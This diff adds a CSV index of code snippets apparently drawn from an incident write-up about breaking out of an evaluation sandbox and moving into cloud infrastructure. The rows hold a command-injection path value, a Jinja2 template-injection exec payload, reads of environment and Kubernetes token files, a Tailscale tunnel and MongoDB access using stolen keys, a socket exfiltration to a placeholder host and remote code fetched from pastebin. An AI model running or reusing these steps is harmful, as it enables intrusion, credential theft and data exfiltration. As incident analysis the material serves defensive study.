@@ -1,0 +1,62 @@
+line,lang,section,lines,code
+58,c,Stage 1: from an OpenAI evaluation sandbox to a rooted launchpad,7,"// attacker-supplied src/main.c (illustrative)
+#include <stdlib.h>
+
+int sqlite3_initialize(void) {
+    system(""id; echo ZZROOTSTART; cat /proc/self/mountinfo"");
+    return 0;
+}"
+70,text,Stage 1: from an OpenAI evaluation sandbox to a rooted launchpad,1,path = src/main.c;echo ZZROOTSTART;cat /proc/self/mountinfo; ... ;false;#
+76,sh,Stage 1: from an OpenAI evaluation sandbox to a rooted launchpad,2,"id            # uid=0(root) gid=0(root)
+env           # dump the environment, look for anything useful"
+83,sh,Stage 1: from an OpenAI evaluation sandbox to a rooted launchpad,3,"cat /proc/self/mountinfo
+ls -la /<sandbox-root> /<sandbox-root>/volumes /<sandbox-root>/mounts /pkg /root
+PATH=/<sandbox-root>/.debug_shell/bin:$PATH curl -s http://<internal-svc>:8000/..."
+103,yaml,Vector 1: HDF5 external raw storage file read,6,"# the malicious dataset config (README.md): each split is one .h5 file,
+# and each .h5 declares its raw data as living at a local path on the worker
+configs:
+  - config_name: envu8     # -> /proc/self/environ
+  - config_name: mainu8    # -> /src/services/worker/src/worker/main.py
+  - config_name: startu8   # -> /src/services/worker/src/worker/start_worker_loop.py"
+118,text,Vector 2: Jinja2 template injection,3,"{{ cycler.__init__.__globals__.__builtins__.exec(
+     ""import gzip,base64; exec(gzip.decompress(base64.b64decode('<payload>')))""
+   ) }}"
+168,sh,Day 1 (07-09): foothold and C2,1,"python3 /tmp/submitted_code.c        # despite the name, this runs staged Python"
+174,python,Day 1 (07-09): foothold and C2,3,"import gzip, base64
+
+exec(gzip.decompress(base64.b64decode(""<blob>"")))"
+190,sh,Day 3 (07-11): lateral movement begins,6,"cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+
+# probe in-cluster API and the public EKS endpoint
+curl -k https://kubernetes.default.svc/api
+curl -k https://<eks-id>.gr7.<region>.eks.amazonaws.com/api"
+201,python,Day 3 (07-11): lateral movement begins,4,"import socket
+
+_orig = socket.getaddrinfo
+socket.getaddrinfo = lambda *a, **k: [(2, 1, 6, '', ('<pinned-ip>', 443))]"
+210,sh,Day 3 (07-11): lateral movement begins,2,"git clone https://<user>:hf_[REDACTED]@huggingface.co/datasets/<attacker>/<staging-repo>
+# then commit gzipped blobs to a side branch as a dead-drop"
+227,sh,Day 3 (07-11): lateral movement begins,2,"getent hosts <internal-connector>.internal.<company>.com
+# -> internal RFC1918 addresses (10.x.x.x)"
+238,sh,Day 4 (07-12): using the stolen credentials,6,"tailscaled --tun=userspace-networking --state=mem: --socket=/tmp/ts.sock \
+   --socks5-server=127.0.0.1:1055 --no-logs-no-support >/tmp/td 2>&1 &
+sleep 3
+$D/tailscale --socket=/tmp/ts.sock up --auth-key=tskey-auth-[REDACTED] \
+   --hostname=<sandbox>-[REDACTED] --accept-routes
+$D/tailscale --socket=/tmp/ts.sock status"
+251,sh,Day 4 (07-12): using the stolen credentials,5,"pip -q install 'pymongo[aws]'
+AWS_ACCESS_KEY_ID=AKIA[REDACTED] AWS_SECRET_ACCESS_KEY=[REDACTED] \
+python3 -c ""import pymongo; \
+c=pymongo.MongoClient('mongodb+srv://<cluster>/?authSource=%24external&authMechanism=MONGODB-AWS', \
+serverSelectionTimeoutMS=4000); print(c.admin.command('ping')); print(c.list_database_names())"""
+261,python,Day 4 (07-12): using the stolen credentials,6,"import os, socket
+
+out = os.popen(""AWS_ACCESS_KEY_ID=AKIA[REDACTED] AWS_SECRET_ACCESS_KEY=[REDACTED] ""
+               ""python3 -c \""import boto3;print(boto3.client('sts').get_caller_identity())\"""").read().encode()
+s = socket.create_connection((""<exfil-host>"", 80))
+s.send(b""POST /<uuid> HTTP/1.0\r\nHost:<capture-svc>\r\nContent-Length:%d\r\n\r\n%b"" % (len(out), out))"
+280,python,"Day 5 (07-13): exfil, persistence, cleanup",2,"from urllib.request import urlopen
+  exec(urlopen(""https://pastebin.service/[REDACTED]"").read())"
+287,sh,"Day 5 (07-13): exfil, persistence, cleanup",2,"echo 'nameserver 8.8.8.8' > /etc/resolv.conf
+  echo '<cdn-ip> pkgs.tailscale.com' >> /etc/hosts"
